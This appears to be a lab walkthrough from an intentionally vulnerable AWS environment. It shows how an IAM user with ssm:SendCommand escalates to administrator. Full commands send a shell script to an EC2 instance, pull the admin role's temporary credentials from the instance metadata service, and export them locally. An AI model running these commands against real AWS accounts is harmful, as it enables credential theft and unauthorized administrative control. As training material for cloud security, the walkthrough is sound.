# Guided Walkthrough: One-Hop Privilege Escalation via ssm:SendCommand

This scenario demonstrates a privilege escalation vulnerability where an IAM user has permission to execute commands on EC2 instances via AWS Systems Manager (SSM) SendCommand. The attacker can execute arbitrary commands on an EC2 instance that has an administrative IAM role attached, extract the temporary credentials from the EC2 instance metadata service, and then use those credentials locally to gain full administrator access.

This attack vector is particularly dangerous because it combines the operational convenience of SSM (remote command execution without SSH/RDP access) with the common misconfiguration of assigning overly privileged IAM roles to EC2 instances. Unlike SSH-based attacks, SSM access is often granted broadly across engineering teams for legitimate troubleshooting purposes, making this a realistic initial access vector.

The attack leaves minimal forensic evidence if SSM Session Manager logging is not properly configured, and the extracted credentials are time-limited but fully functional AWS credentials that can be used from any location.

## The Challenge

You start with credentials for `pl-prod-ssm-002-to-admin-starting-user` — an IAM user whose policy grants `ssm:SendCommand`, `ssm:ListCommands`, `ssm:ListCommandInvocations`, and `ec2:DescribeInstances`. You do not have direct IAM or administrative access.

Your goal is to reach the `pl-prod-ssm-002-to-admin-ec2-admin-role` IAM role, which carries `AdministratorAccess`. That role lives as an instance profile on a running EC2 instance. The EC2 instance has the SSM agent installed, which means you can reach it through the SSM control plane.

Credentials for the starting user are available from Terraform outputs:

```bash
cd <project-root>
terraform output -json | jq '.single_account_privesc_one_hop_to_admin_ssm_002_ssm_sendcommand.value'
```

## Reconnaissance

First, confirm who you are and what you cannot do yet:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-ssm-002-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- confirmed, no admin access yet
```

Now find the target EC2 instance. The `ec2:DescribeInstances` helpful permission lets you enumerate running instances and see which ones have an IAM instance profile attached:

```bash
aws ec2 describe-instances \
  --filters 'Name=instance-state-name,Values=running' \
  --query 'Reservations[*].Instances[*].[InstanceId,IamInstanceProfile.Arn]' \
  --output table
```

You should see the target instance with the `pl-prod-ssm-002-to-admin-ec2-admin-profile` instance profile. Note the instance ID (e.g., `i-0abc123...`).

Verify the SSM agent is online before attempting to send a command:

```bash
aws ssm describe-instance-information \
  --filters "Key=InstanceIds,Values=<instance_id>" \
  --query 'InstanceInformationList[0].PingStatus' \
  --output text
# Online
```

## Exploitation

With the instance confirmed as SSM-reachable, send a command that uses IMDSv2 to retrieve the temporary credentials for the attached IAM role. IMDSv2 requires a two-step process: first obtain a session token with a PUT request, then use that token in a GET request for the credentials.

```bash
COMMAND_ID=$(aws ssm send-command \
  --instance-ids "<instance_id>" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" 2>/dev/null)","curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/pl-prod-ssm-002-to-admin-ec2-admin-role 2>/dev/null"]' \
  --query 'Command.CommandId' \
  --output text)

echo "Command ID: $COMMAND_ID"
```

The command is now running on the instance. Wait 15-30 seconds for it to complete, then poll for the status:

```bash
aws ssm list-commands \
  --command-id "$COMMAND_ID" \
  --query 'Commands[0].Status' \
  --output text
# Success
```

Once the status is `Success`, retrieve the output — which contains the JSON credentials blob from the metadata service:

```bash
CREDS_JSON=$(aws ssm list-command-invocations \
  --command-id "$COMMAND_ID" \
  --details \
  --query 'CommandInvocations[0].CommandPlugins[0].Output' \
  --output text)

echo "$CREDS_JSON"
# {
#   "Code": "Success",
#   "LastUpdated": "...",
#   "Type": "AWS-HMAC",
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }
```

Parse out the three credential components and export them:

```bash
export AWS_ACCESS_KEY_ID=$(echo "$CREDS_JSON" | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Token')
```

## Verification

Confirm your new identity and that you have administrator access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::<account_id>:assumed-role/pl-prod-ssm-002-to-admin-ec2-admin-role/...

aws iam list-users --max-items 3 --output table
# Returns a list of IAM users -- you now have AdministratorAccess
```

## What Happened

You used `ssm:SendCommand` to run an arbitrary shell command on an EC2 instance that happened to carry an administrative IAM role. The shell command reached out to the Instance Metadata Service (IMDS) and retrieved the temporary credentials that AWS automatically makes available to the attached role. By exporting those credentials in your local shell, you inherited the full `AdministratorAccess` policy of the EC2 instance role — without ever logging into the instance via SSH, and without possessing any direct IAM privilege escalation permissions.

This pattern is common in real environments because SSM SendCommand is widely granted for operational purposes (running commands, patching, debugging) and EC2 instances are frequently over-provisioned with IAM roles for convenience. The combination creates a silent privilege escalation path that many CSPM tools fail to flag as a connected risk.
